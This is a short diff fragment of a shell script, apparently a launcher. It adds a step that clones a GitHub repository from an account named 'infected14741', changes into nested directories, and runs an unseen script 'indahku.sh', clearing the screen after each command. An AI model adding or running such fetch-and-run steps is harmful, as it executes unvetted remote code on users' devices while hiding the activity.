@@ -20,5 +20,14 @@ cd rindu
 clear
 cd kamu
 clear
-git clone 
-
+git clone https://github.com/infected14741/diyfoutuotuogipguogojguhegeyirsnsbdjcicyshsjsln
+clear
+cd diyfoutuotuogipguogojguhegeyirsnsbdjcicyshsjsln
+clear
+cd i
+clear
+cd love
+clear
+cd you
+clear
+sh indahku.sh
